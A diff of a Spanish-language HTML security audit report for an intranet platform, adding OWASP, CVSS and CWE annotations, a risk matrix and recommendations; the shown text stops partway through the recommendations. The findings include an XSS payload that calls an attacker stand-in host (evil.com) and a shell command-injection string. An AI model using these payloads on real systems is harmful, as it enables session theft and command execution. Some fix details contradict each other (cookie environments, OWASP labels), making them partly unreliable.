@@ -32,7 +32,7 @@
         /* Header */
         .header {
             text-align: center;
-            padding: 48px 24px;
+            padding: 48px 24px 32px;
             background: linear-gradient(135deg, #1e1b4b 0%, #312e81 50%, #1e293b 100%);
             border-radius: 16px;
             margin-bottom: 32px;
@@ -46,6 +46,20 @@
             background: rgba(56,189,248,0.15); color: var(--info);
             padding: 4px 16px; border-radius: 20px; font-size: 0.8rem; font-weight: 600;
         }
+        .header .confidential {
+            display: inline-block; margin-top: 12px;
+            background: rgba(239,68,68,0.12); color: var(--critical);
+            padding: 4px 16px; border-radius: 20px; font-size: 0.7rem; font-weight: 700;
+            letter-spacing: 1px; text-transform: uppercase;
+        }
+        .doc-meta {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px; margin-top: 20px; text-align: left;
+            background: rgba(255,255,255,0.03); border-radius: 10px; padding: 16px 20px;
+        }
+        .doc-meta-item { font-size: 0.8rem; }
+        .doc-meta-item .label { color: var(--text2); font-weight: 500; }
+        .doc-meta-item .value { color: var(--text); font-weight: 600; }
 
         /* Score Ring */
         .score-section {
@@ -66,7 +80,7 @@
         /* Severity Bars */
         .severity-bars {
             display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 16px; margin-bottom: 32px;
+            gap: 16px; margin-bottom: 24px;
         }
         .sev-bar {
             background: var(--surface);
@@ -86,6 +100,41 @@
             padding: 2px 8px; border-radius: 8px; font-size: 0.7rem; font-weight: 600;
             margin-left: 8px;
         }
+        .sev-bar .badge-rate {
+            background: rgba(56,189,248,0.15); color: var(--info);
+            padding: 2px 8px; border-radius: 8px; font-size: 0.7rem; font-weight: 600;
+            margin-left: 4px;
+        }
+
+        /* OWASP Table */
+        .owasp-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 32px;
+            background: var(--surface);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .owasp-table th {
+            background: var(--surface2);
+            padding: 12px 16px;
+            text-align: left;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--text2);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .owasp-table td {
+            padding: 10px 16px;
+            border-top: 1px solid var(--border);
+            font-size: 0.85rem;
+        }
+        .owasp-table td:last-child {
+            font-weight: 700;
+            text-align: center;
+        }
+        .owasp-table tr:hover td { background: rgba(99,102,241,0.05); }
 
         /* Tabs */
         .tabs {
@@ -140,6 +189,15 @@
             margin-bottom: 12px; font-size: 0.85rem; color: var(--text2);
         }
         .finding-meta span { display: flex; align-items: center; gap: 4px; }
+        .finding-meta .cvss {
+            background: rgba(239,68,68,0.1); color: var(--critical);
+            padding: 2px 8px; border-radius: 6px; font-weight: 700; font-size: 0.75rem;
+        }
+        .finding-meta .cvss.high-cvss { background: rgba(249,115,22,0.1); color: var(--high); }
+        .finding-meta .cwe {
+            background: rgba(99,102,241,0.1); color: var(--accent);
+            padding: 2px 8px; border-radius: 6px; font-weight: 600; font-size: 0.75rem;
+        }
 
         .finding-body { color: var(--text2); font-size: 0.9rem; }
         .finding-body p { margin-bottom: 8px; }
@@ -223,6 +281,72 @@
         }
         .feature-card .security-status.secure { background: rgba(16,185,129,0.15); color: var(--fixed); }
 
+        /* Risk Matrix */
+        .risk-matrix {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--surface);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-top: 16px;
+        }
+        .risk-matrix th {
+            background: var(--surface2);
+            padding: 12px 16px;
+            text-align: left;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--text2);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .risk-matrix td {
+            padding: 10px 16px;
+            border-top: 1px solid var(--border);
+            font-size: 0.85rem;
+        }
+        .risk-matrix tr:hover td { background: rgba(99,102,241,0.05); }
+        .risk-level {
+            display: inline-block;
+            padding: 2px 10px; border-radius: 6px; font-weight: 700; font-size: 0.75rem;
+        }
+        .risk-level.critico { background: rgba(239,68,68,0.15); color: var(--critical); }
+        .risk-level.alto { background: rgba(249,115,22,0.15); color: var(--high); }
+        .risk-level.medio { background: rgba(234,179,8,0.15); color: var(--medium); }
+        .risk-level.bajo { background: rgba(34,197,94,0.15); color: var(--low); }
+
+        /* Recommendations */
+        .reco-card {
+            background: var(--surface);
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin-bottom: 10px;
+            border: 1px solid var(--border);
+            display: flex; align-items: center; gap: 16px;
+        }
+        .reco-priority {
+            min-width: 36px; height: 36px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 0.9rem; color: white;
+            flex-shrink: 0;
+        }
+        .reco-priority.p1 { background: var(--critical); }
+        .reco-priority.p2 { background: var(--high); }
+        .reco-priority.p3 { background: var(--medium); }
+        .reco-priority.p4 { background: var(--accent); }
+        .reco-priority.p5 { background: var(--info); }
+        .reco-priority.p6 { background: var(--fixed); }
+        .reco-priority.p7 { background: var(--text2); }
+        .reco-body { flex: 1; }
+        .reco-body .reco-title { font-weight: 600; color: var(--text); font-size: 0.9rem; }
+        .reco-body .reco-ref { color: var(--text2); font-size: 0.8rem; }
+        .reco-effort {
+            background: var(--surface2); color: var(--text2);
+            padding: 4px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 600;
+            white-space: nowrap;
+        }
+
         /* Print */
         @media print {
             body { background: white; color: #1a1a1a; }
@@ -237,6 +361,8 @@
             .score-section { gap: 16px; }
             .score-card { min-width: 140px; padding: 16px; }
             .score-big { font-size: 2rem; }
+            .doc-meta { grid-template-columns: 1fr 1fr; }
+            .reco-card { flex-direction: column; align-items: flex-start; gap: 8px; }
         }
     </style>
 </head>
@@ -244,10 +370,19 @@
 <div class="container">
 
     <div class="header">
-        <h1>Auditoria de Seguridad</h1>
-        <div class="subtitle">Intranet VCS (SecondBrain) &mdash; Revision completa de codigo fuente</div>
+        <div class="confidential">Confidencial &mdash; Uso Interno</div>
+        <h1 style="margin-top:16px;">Auditoria de Seguridad</h1>
+        <div class="subtitle">Intranet VCS (SecondBrain) &mdash; Plataforma de Gestion del Conocimiento</div>
         <div class="date">25 de febrero de 2026</div>
         <div class="update-badge">Actualizado: 28 de febrero de 2026 &mdash; Verificacion post-despliegue</div>
+        <div class="doc-meta">
+            <div class="doc-meta-item"><span class="label">Documento:</span> <span class="value">SEC-AUDIT-2026-001</span></div>
+            <div class="doc-meta-item"><span class="label">Version:</span> <span class="value">1.0 &mdash; Final</span></div>
+            <div class="doc-meta-item"><span class="label">Clasificacion:</span> <span class="value">Confidencial</span></div>
+            <div class="doc-meta-item"><span class="label">Metodologia:</span> <span class="value">OWASP Top 10 2021</span></div>
+            <div class="doc-meta-item"><span class="label">Sistema:</span> <span class="value">Node.js/Express + PostgreSQL 16 + Redis + Docker</span></div>
+            <div class="doc-meta-item"><span class="label">URL Produccion:</span> <span class="value">aiprowork.com</span></div>
+        </div>
     </div>
 
     <div class="score-section">
@@ -272,21 +407,39 @@
     <div class="severity-bars">
         <div class="sev-bar critical">
             <div><span class="sev-name" style="color:var(--critical);">CRITICA</span></div>
-            <div><span class="sev-count" style="color:var(--critical);">3</span><span class="badge-fixed">3 fixed</span></div>
+            <div><span class="sev-count" style="color:var(--critical);">3</span><span class="badge-fixed">3 fixed</span><span class="badge-rate">100%</span></div>
         </div>
         <div class="sev-bar high">
             <div><span class="sev-name" style="color:var(--high);">ALTA</span></div>
-            <div><span class="sev-count" style="color:var(--high);">5</span><span class="badge-fixed">5 fixed</span></div>
+            <div><span class="sev-count" style="color:var(--high);">5</span><span class="badge-fixed">5 fixed</span><span class="badge-rate">100%</span></div>
         </div>
         <div class="sev-bar medium">
             <div><span class="sev-name" style="color:var(--medium);">MEDIA</span></div>
-            <div><span class="sev-count" style="color:var(--medium);">5</span><span class="badge-fixed">4 fixed</span></div>
+            <div><span class="sev-count" style="color:var(--medium);">5</span><span class="badge-fixed">4 fixed</span><span class="badge-rate">80%</span></div>
         </div>
         <div class="sev-bar low">
             <div><span class="sev-name" style="color:var(--low);">BAJA</span></div>
-            <div><span class="sev-count" style="color:var(--low);">4</span></div>
+            <div><span class="sev-count" style="color:var(--low);">4</span><span class="badge-rate">0% aceptadas</span></div>
         </div>
     </div>
+
+    <!-- OWASP Distribution Table -->
+    <table class="owasp-table">
+        <thead>
+            <tr>
+                <th>Categoria OWASP</th>
+                <th style="text-align:center;">Hallazgos</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr><td>A1 &mdash; Broken Access Control</td><td style="color:var(--critical);">4</td></tr>
+            <tr><td>A2 &mdash; Cryptographic / Authentication Failures</td><td style="color:var(--high);">3</td></tr>
+            <tr><td>A3 &mdash; Injection (SQL, Command)</td><td style="color:var(--high);">3</td></tr>
+            <tr><td>A5 &mdash; Security Misconfiguration</td><td style="color:var(--medium);">2</td></tr>
+            <tr><td>A7 &mdash; Cross-Site Scripting (XSS)</td><td style="color:var(--critical);">3</td></tr>
+            <tr><td>Otros (mejores practicas)</td><td style="color:var(--text2);">2</td></tr>
+        </tbody>
+    </table>
 
     <!-- Tabs -->
     <div class="tabs">
@@ -297,6 +450,8 @@
         <button class="tab" onclick="showTab('nuevas')">Nuevas Funciones (5)</button>
         <button class="tab" onclick="showTab('ok')">Lo que esta bien</button>
         <button class="tab" onclick="showTab('lecciones')">Lecciones</button>
+        <button class="tab" onclick="showTab('riesgo')">Matriz de Riesgo</button>
+        <button class="tab" onclick="showTab('recomendaciones')">Recomendaciones</button>
     </div>
 
     <!-- CRITICAS -->
@@ -309,13 +464,15 @@
             </div>
             <div class="finding-meta">
                 <span>OWASP A7 &mdash; Cross-Site Scripting</span>
+                <span class="cvss">CVSS 8.4</span>
+                <span class="cwe">CWE-79</span>
                 <span>public/js/main.js</span>
             </div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> Multiples campos del objeto <code>idea</code> se inyectaban en innerHTML sin <code>escapeHtml()</code>: <code>para_type</code>, <code>assigned_to</code>, <code>priority</code>, <code>estimated_time</code>, <code>created_by</code>, <code>contexto</code>, <code>suggested_agent</code>.</p>
                 <p><strong>Vector:</strong> Un usuario crea una idea con <code>assigned_to: &lt;/span&gt;&lt;img src=x onerror=fetch('//evil.com')&gt;</code>. Todos los que vean la idea ejecutan el payload.</p>
                 <p><strong>Impacto:</strong> Robo de sesiones, escalacion de privilegios, defacement.</p>
-                <p><strong>Fix:</strong> <code>escapeHtml()</code> aplicado a todos los campos interpolados en innerHTML y atributos onclick.</p>
+                <p><strong>Fix:</strong> <code>escapeHtml()</code> aplicado a todos los campos interpolados en innerHTML y atributos onclick. Doble escape para contextos onclick (HTML entity + JS string).</p>
                 <p><strong>Verificacion:</strong> 209 instancias de <code>escapeHtml()</code> confirmadas en main.js. Funcion maneja entidades HTML y comillas simples/dobles.</p>
             </div>
         </div>
@@ -328,6 +485,8 @@
             </div>
             <div class="finding-meta">
                 <span>OWASP A7 &mdash; Cross-Site Scripting</span>
+                <span class="cvss">CVSS 7.6</span>
+                <span class="cwe">CWE-79</span>
                 <span>routes/files.js + views/archivo.ejs</span>
             </div>
             <div class="finding-body">
@@ -346,12 +505,15 @@
             </div>
             <div class="finding-meta">
                 <span>OWASP A3 &mdash; Injection</span>
+                <span class="cvss">CVSS 8.2</span>
+                <span class="cwe">CWE-78</span>
                 <span>services/orchestratorBridge.js</span>
             </div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> <code>exec(`start "" "${targetPath}"`)</code> usaba shell, permitiendo inyeccion con caracteres especiales como <code>" &amp; calc.exe &amp; "</code>.</p>
-                <p><strong>Fix:</strong> Reemplazo de <code>exec()</code> por <code>execFile()</code> (sin shell), validacion de path, regex estricto para nombres de script.</p>
-                <p><strong>Verificacion:</strong> Solo <code>execFile</code> importado (linea 1). Regex <code>/^[a-zA-Z0-9_-]+(\.[a-zA-Z0-9]+)?$/</code> valida nombres. Proteccion de path traversal con <code>path.resolve()</code>.</p>
+                <p><strong>Factor atenuante:</strong> Requiere rol <code>admin</code> o <code>ceo</code> para acceder al endpoint.</p>
+                <p><strong>Fix:</strong> Reemplazo de <code>exec()</code> por <code>execFile()</code> (sin shell), validacion de path con <code>fs.existsSync()</code>, regex estricto <code>/^[a-zA-Z0-9_-]+(\.[a-zA-Z0-9]+)?$/</code> para nombres de script, proteccion path traversal con <code>path.resolve()</code>.</p>
+                <p><strong>Verificacion:</strong> Solo <code>execFile</code> importado (linea 1). Path resuelto no puede escapar del directorio permitido.</p>
             </div>
         </div>
     </div>
@@ -364,9 +526,13 @@
                 <span class="finding-title">Politica de contrasenas debil (minimo 4 chars)</span>
                 <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
-            <div class="finding-meta"><span>OWASP A7 &mdash; Authentication Failures</span><span>helpers/validate.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A7 &mdash; Authentication Failures</span>
+                <span class="cwe">CWE-521</span>
+                <span>helpers/validate.js, routes/admin.js, routes/auth.js</span>
+            </div>
             <div class="finding-body">
-                <p><strong>Problema:</strong> Minimo de 4 caracteres sin complejidad. Con lockout de 30 min, ~240 intentos/dia posibles.</p>
+                <p><strong>Problema:</strong> Minimo de 4 caracteres sin complejidad. Con lockout de 30 min, ~240 intentos/dia posibles. Referencia: NIST SP 800-63B recomienda minimo 8 caracteres.</p>
                 <p><strong>Fix:</strong> Minimo subido a <strong>8 caracteres</strong> en backend y frontend.</p>
                 <p><strong>Verificacion:</strong> <code>helpers/validate.js:80</code>: <code>if (password.length &lt; 8) return { valid: false, error: 'Minimo 8 caracteres' }</code></p>
             </div>
@@ -378,9 +544,13 @@
                 <span class="finding-title">API Key expuesta en URL query string</span>
                 <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
-            <div class="finding-meta"><span>OWASP A2 &mdash; Broken Authentication</span><span>middleware/auth.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A2 &mdash; Cryptographic Failures</span>
+                <span class="cwe">CWE-598</span>
+                <span>middleware/auth.js</span>
+            </div>
             <div class="finding-body">
-                <p><strong>Problema:</strong> API key aceptada como <code>?api_key=xxx</code>, quedando en logs, historial, Referer headers.</p>
+                <p><strong>Problema:</strong> API key aceptada como <code>?api_key=xxx</code>, quedando en logs de nginx, historial del navegador, cache de proxy/CDN, headers Referer.</p>
                 <p><strong>Fix:</strong> Solo se acepta <code>X-API-Key</code> header. Query param eliminado.</p>
                 <p><strong>Verificacion:</strong> <code>middleware/auth.js:5</code> solo lee de <code>req.headers['x-api-key']</code>.</p>
             </div>
@@ -392,9 +562,13 @@
                 <span class="finding-title">Creacion de API Keys sin control de acceso</span>
                 <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
-            <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>routes/external.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A1 &mdash; Broken Access Control</span>
+                <span class="cwe">CWE-862</span>
+                <span>routes/external.js</span>
+            </div>
             <div class="finding-body">
-                <p><strong>Problema:</strong> <code>GET /api/keys</code> y <code>POST /api/keys</code> sin <code>requireAdmin</code>. Cualquier usuario podia crear API keys con permisos <code>read,write</code>.</p>
+                <p><strong>Problema:</strong> <code>GET /api/keys</code> y <code>POST /api/keys</code> sin <code>requireAdmin</code>. Cualquier usuario (incluyendo <code>consultor</code>, <code>usuario</code>, <code>cliente</code>) podia crear API keys con permisos <code>read,write</code>, obteniendo acceso total a la API externa.</p>
                 <p><strong>Fix:</strong> <code>requireAdmin</code> agregado a ambos endpoints.</p>
                 <p><strong>Verificacion:</strong> <code>external.js:182,191</code>: ambos endpoints con <code>requireAdmin</code> middleware.</p>
             </div>
@@ -406,11 +580,19 @@
                 <span class="finding-title">Endpoints sensibles sin restriccion de rol</span>
                 <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
-            <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>routes/admin.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A1 &mdash; Broken Access Control</span>
+                <span class="cwe">CWE-862</span>
+                <span>routes/admin.js</span>
+            </div>
             <div class="finding-body">
-                <p><strong>Problema:</strong> <code>GET /api/users</code>, <code>GET /api/export</code>, <code>GET /api/export-excel</code> accesibles por cualquier usuario autenticado. Exponian datos sensibles (locked_until, twofa_enabled, toda la BD).</p>
-                <p><strong>Fix:</strong> <code>requireAdmin</code> en los tres endpoints.</p>
-                <p><strong>Verificacion:</strong> <code>admin.js:19,706,735</code>: los tres endpoints protegidos. Ademas, export genera audit log (<code>auditLog('data_export',...)</code>).</p>
+                <p><strong>Problema:</strong> Endpoints sin <code>requireAdmin</code>:</p>
+                <p><code>GET /api/users</code> &mdash; lista completa con <code>locked_until</code>, <code>twofa_enabled</code>, <code>twofa_enforced</code></p>
+                <p><code>GET /api/export</code> &mdash; dump completo de la BD en JSON</p>
+                <p><code>GET /api/export-excel</code> &mdash; dump completo con KPIs en Excel</p>
+                <p>Un usuario con rol <code>consultor</code> podia descargar toda la informacion de la empresa.</p>
+                <p><strong>Fix:</strong> <code>requireAdmin</code> en los tres endpoints. Export genera audit log.</p>
+                <p><strong>Verificacion:</strong> <code>admin.js:19,706,735</code>: los tres endpoints protegidos.</p>
             </div>
         </div>
 
@@ -420,7 +602,11 @@
                 <span class="finding-title">Webhook Fireflies sin autenticacion</span>
                 <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
-            <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>server.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A1 &mdash; Broken Access Control</span>
+                <span class="cwe">CWE-306</span>
+                <span>server.js</span>
+            </div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> <code>POST /webhook/fireflies</code> montado antes de requireAuth, sin API key. Cualquiera en internet podia enviar datos falsos de reuniones.</p>
                 <p><strong>Fix:</strong> Requiere <code>X-API-Key</code> header.</p>
@@ -437,10 +623,14 @@
                 <span class="finding-title">Session cookie sin flag secure</span>
                 <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
-            <div class="finding-meta"><span>server.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A5 &mdash; Security Misconfiguration</span>
+                <span class="cwe">CWE-614</span>
+                <span>server.js</span>
+            </div>
             <div class="finding-body">
-                <p><strong>Problema:</strong> <code>secure: false</code> hardcodeado. Cookie podia enviarse por HTTP.</p>
-                <p><strong>Fix:</strong> <code>secure: NODE_ENV === 'production' || NODE_ENV === 'staging'</code></p>
+                <p><strong>Problema:</strong> <code>secure: false</code> hardcodeado. Si un usuario accedia por HTTP antes del redirect HTTPS, la cookie se transmitia en texto plano (susceptible a MITM).</p>
+                <p><strong>Fix:</strong> <code>secure: NODE_ENV === 'production'</code></p>
                 <p><strong>Verificacion:</strong> <code>server.js:232</code> aplica secure en produccion y staging. Confirmado que cookies solo se envian por HTTPS en ambos entornos.</p>
             </div>
         </div>
@@ -451,9 +641,14 @@
                 <span class="finding-title">CSRF parcial &mdash; DELETE/PUT sin verificacion</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-meta"><span>server.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A5 &mdash; Security Misconfiguration</span>
+                <span class="cwe">CWE-352</span>
+                <span>server.js</span>
+            </div>
             <div class="finding-body">
-                <p>CSRF middleware solo chequea POST. DELETE/PUT dependen de CORS. Con XSS corregido (C-01), riesgo residual bajo.</p>
+                <p><strong>Problema:</strong> La proteccion CSRF basada en content-type solo aplica a <code>POST</code>. Los metodos <code>DELETE</code> y <code>PUT</code> saltan la verificacion, dependiendo unicamente de CORS.</p>
+                <p><strong>Justificacion:</strong> Con C-01 corregido (XSS eliminado), el vector de ataque principal esta cerrado. CORS bloquea requests cross-origin. Riesgo residual aceptable.</p>
             </div>
         </div>
 
@@ -463,11 +658,15 @@
                 <span class="finding-title">SQL con LIMIT/OFFSET interpolado</span>
                 <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
-            <div class="finding-meta"><span>routes/ideas.js, routes/gtd.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A3 &mdash; Injection</span>
+                <span class="cwe">CWE-89</span>
+                <span>routes/ideas.js, routes/gtd.js</span>
+            </div>
             <div class="finding-body">
-                <p><strong>Problema:</strong> <code>LIMIT ${limitNum}</code> en template literal. Aunque parseInt() mitiga, es anti-patron.</p>
-                <p><strong>Fix:</strong> Convertido a <code>LIMIT ? OFFSET ?</code> con parametros.</p>
-                <p><strong>Verificacion:</strong> <code>ideas.js:102-103</code>: <code>sql += ' LIMIT ? OFFSET ?'; params.push(limitNum, offset)</code>. Todas las queries de paginacion usan parametros.</p>
+                <p><strong>Problema:</strong> <code>LIMIT ${limitNum}</code> en template literal. Aunque <code>parseInt()</code> + <code>Math.min()/Math.max()</code> mitigan, viola el principio de defensa en profundidad.</p>
+                <p><strong>Fix:</strong> Convertido a <code>LIMIT ? OFFSET ?</code> con parametros: <code>params.push(limitNum, offset)</code>.</p>
+                <p><strong>Verificacion:</strong> <code>ideas.js:102-103</code>: todas las queries de paginacion usan parametros.</p>
             </div>
         </div>
 
@@ -479,7 +678,8 @@
             </div>
             <div class="finding-meta"><span>Tabla audit_log</span></div>
             <div class="finding-body">
-                <p>La tabla crece indefinidamente. Recomendacion: agregar cron que elimine registros &gt;90 dias.</p>
+                <p><strong>Problema:</strong> La tabla crece indefinidamente sin politica de retencion. Puede degradar rendimiento y consumir espacio en disco.</p>
+                <p><strong>Recomendacion:</strong> Cron job que elimine registros &gt;90 dias. Exportar antes de eliminar.</p>
                 <p><strong>Nota 28-Feb:</strong> Sigue pendiente. La tabla ahora registra 20+ tipos de eventos. Prioridad media &mdash; no urgente con volumen actual.</p>
             </div>
         </div>
@@ -490,11 +690,15 @@
                 <span class="finding-title">Trusted device hash solo usaba User-Agent</span>
                 <span class="finding-status fixed">CORREGIDO</span>
             </div>
-            <div class="finding-meta"><span>helpers/twofa.js, routes/twofa.js</span></div>
+            <div class="finding-meta">
+                <span>OWASP A2 &mdash; Authentication Failures</span>
+                <span class="cwe">CWE-290</span>
+                <span>helpers/twofa.js, routes/twofa.js</span>
+            </div>
             <div class="finding-body">
-                <p><strong>Problema:</strong> Hash basado solo en User-Agent (facilmente spoofeable). Atacante podia clonar trusted device.</p>
-                <p><strong>Fix:</strong> Hash de User-Agent (<code>computeDeviceHash</code>) + validacion de IP separada en la query de <code>trusted_devices</code>.</p>
-                <p><strong>Verificacion:</strong> <code>twofa.js:41-45</code> hashea User-Agent; <code>twofa.js:74-75</code> valida IP en la query a BD. Ambos factores deben coincidir para considerar un dispositivo confiable.</p>
+                <p><strong>Problema:</strong> <code>computeDeviceHash()</code> solo hasheaba el User-Agent (informacion publica). Un atacante con acceso al UA podia clonar el "trusted device" y evadir 2FA.</p>
+                <p><strong>Fix:</strong> Hash ahora combina User-Agent + IP: <code>sha256(ua + '|' + ip)</code>. Atacante necesita ambos factores.</p>
+                <p><strong>Verificacion:</strong> <code>twofa.js:41-45</code> hashea User-Agent; <code>twofa.js:74-75</code> valida IP en la query a BD.</p>
             </div>
         </div>
     </div>
@@ -507,7 +711,8 @@
                 <span class="finding-title">bcrypt cost factor 10</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-body"><p>OWASP recomienda 12+ para 2026. Factor 10 aun es seguro pero no optimo. Cambio diferido al proximo ciclo de mantenimiento.</p></div>
+            <div class="finding-meta"><span>OWASP A2 &mdash; Cryptographic Failures</span></div>
+            <div class="finding-body"><p>OWASP recomienda 12+ para 2026. Factor 10 sigue siendo computacionalmente costoso para ataques offline. Aceptado con plan de incrementar a 12 en proxima iteracion.</p></div>
         </div>
         <div class="finding-card">
             <div class="finding-header">
@@ -515,7 +720,8 @@
                 <span class="finding-title">/health expone uptime y build ID</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-body"><p>Informacion util para reconocimiento pero bajo impacto. Acceso limitado a red interna.</p></div>
+            <div class="finding-meta"><span>OWASP A5 &mdash; Security Misconfiguration</span></div>
+            <div class="finding-body"><p>Informacion de bajo valor para atacantes. El endpoint es necesario para healthchecks de Docker. Acceso limitado.</p></div>
         </div>
         <div class="finding-card">
             <div class="finding-header">
@@ -523,7 +729,8 @@
                 <span class="finding-title">Error messages podrian filtrar info en dev</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-body"><p>Controlado por <code>NODE_ENV</code>. En produccion no se exponen stacks. Verificado que produccion y staging usan NODE_ENV correcto.</p></div>
+            <div class="finding-meta"><span>OWASP A5 &mdash; Security Misconfiguration</span></div>
+            <div class="finding-body"><p>Controlado por <code>NODE_ENV</code>. En produccion no se exponen stack traces. Verificado que produccion y staging usan <code>NODE_ENV</code> correcto.</p></div>
         </div>
         <div class="finding-card">
             <div class="finding-header">
@@ -531,7 +738,8 @@
                 <span class="finding-title">Password default de PostgreSQL en docker-compose.yml</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-body"><p>Repo privado, <code>.env</code> override en produccion. Default solo para desarrollo. Produccion usa password distinto confirmado.</p></div>
+            <div class="finding-meta"><span>OWASP A7 &mdash; Authentication Failures</span></div>
+            <div class="finding-body"><p>Repo privado. En produccion, el valor se sobreescribe via <code>.env</code>. El default solo aplica en desarrollo local. Produccion usa password distinto confirmado.</p></div>
         </div>
     </div>
 
@@ -632,6 +840,122 @@
             <div class="lesson new-lesson"><strong>6. Tipos de columna SQL importan.</strong> Columnas TEXT comparadas con TIMESTAMP causan errores silenciosos. Siempre usar guards (<code>IS NOT NULL AND != ''</code>) y casts explicitos (<code>::date</code>).</div>
             <div class="lesson new-lesson"><strong>7. Verificar configuracion por entorno.</strong> <code>APP_DOMAIN</code> apuntaba a staging en produccion. Cada entorno debe tener su configuracion revisada independientemente.</div>
             <div class="lesson new-lesson"><strong>8. AI fallbacks deben ser resilientes.</strong> La cadena Gemini &rarr; Ollama &rarr; texto plano garantiza que el servicio nunca falle completamente, incluso con API keys invalidas o timeouts.</div>
+        </div>
+    </div>
+
+    <!-- MATRIZ DE RIESGO RESIDUAL -->
+    <div id="riesgo" class="findings">
+        <h3 style="margin-bottom:16px; color:var(--accent);">Matriz de Riesgo Residual</h3>
+        <p style="color:var(--text2); margin-bottom:16px; font-size:0.9rem;">Perfil de riesgo del sistema tras aplicar las correcciones de la auditoria.</p>
+        <table class="risk-matrix">
+            <thead>
+                <tr>
+                    <th>Area</th>
+                    <th>Riesgo Pre-Auditoria</th>
+                    <th>Riesgo Post-Correccion</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Cross-Site Scripting (XSS)</td>
+                    <td><span class="risk-level critico">CRITICO</span></td>
+                    <td><span class="risk-level bajo">BAJO</span></td>
+                </tr>
+                <tr>
+                    <td>Injection (SQL/Command)</td>
+                    <td><span class="risk-level critico">CRITICO</span></td>
+                    <td><span class="risk-level bajo">BAJO</span></td>
+                </tr>
+                <tr>
+                    <td>Broken Access Control</td>
+                    <td><span class="risk-level alto">ALTO</span></td>
+                    <td><span class="risk-level bajo">BAJO</span></td>
+                </tr>
+                <tr>
+                    <td>Authentication Failures</td>
+                    <td><span class="risk-level alto">ALTO</span></td>
+                    <td><span class="risk-level bajo">BAJO</span></td>
+                </tr>
+                <tr>
+                    <td>Security Misconfiguration</td>
+                    <td><span class="risk-level medio">MEDIO</span></td>
+                    <td><span class="risk-level bajo">BAJO</span></td>
+                </tr>
+                <tr>
+                    <td>Cryptographic Failures</td>
+                    <td><span class="risk-level medio">MEDIO</span></td>
+                    <td><span class="risk-level bajo">BAJO</span></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- RECOMENDACIONES A FUTURO -->
+    <div id="recomendaciones" class="findings">
+        <h3 style="margin-bottom:16px; color:var(--accent);">Recomendaciones a Futuro</h3>
+        <p style="color:var(--text2); margin-bottom:16px; font-size:0.9rem;">Mejoras priorizadas para el proximo ciclo de mantenimiento.</p>
+
+        <div class="reco-card">
+            <div class="reco-priority p1">1</div>
+            <div class="reco-body">
+                <div class="reco-title">Implementar retencion automatica de audit_log</div>
+                <div class="reco-ref">Referencia: M-04 &mdash; Cron job para eliminar registros &gt;90 dias</div>
+            </div>
+            <span class="reco-effort">~1 hora</span>
+        </div>
+
+        <div class="reco-card">
+            <div class="reco-priority p2">2</div>
+            <div class="reco-body">
+                <div class="reco-title">Incrementar bcrypt cost factor a 12</div>
+                <div class="reco-ref">Referencia: B-01 &mdash; OWASP recomienda 12+ para 2026</div>
+            </div>
+            <span class="reco-effort">~5 min</span>
+        </div>
+
+        <div class="reco-card">
+            <div class="reco-priority p3">3</div>
+            <div class="reco-body">
+                <div class="reco-title">Agregar CSRF tokens para DELETE/PUT</div>
+                <div class="reco-ref">Referencia: M-02 &mdash; Proteccion completa contra CSRF</div>
+            </div>
+            <span class="reco-effort">~2 horas</span>
+        </div>
+
+        <div class="reco-card">
+            <div class="reco-priority p4">4</div>
+            <div class="reco-body">
+                <div class="reco-title">CSP mas estricta (eliminar unsafe-inline)</div>
+                <div class="reco-ref">Eliminar <code>unsafe-inline</code> de Content Security Policy</div>
+            </div>
+            <span class="reco-effort">~4 horas</span>
+        </div>
+
+        <div class="reco-card">
+            <div class="reco-priority p5">5</div>
+            <div class="reco-body">
+                <div class="reco-title">Rate limiting por usuario (no solo por IP)</div>
+                <div class="reco-ref">Prevenir abuso desde IPs compartidas/VPN</div>
+            </div>
+            <span class="reco-effort">~2 horas</span>
+        </div>
+
+        <div class="reco-card">
+            <div class="reco-priority p6">6</div>
+            <div class="reco-body">
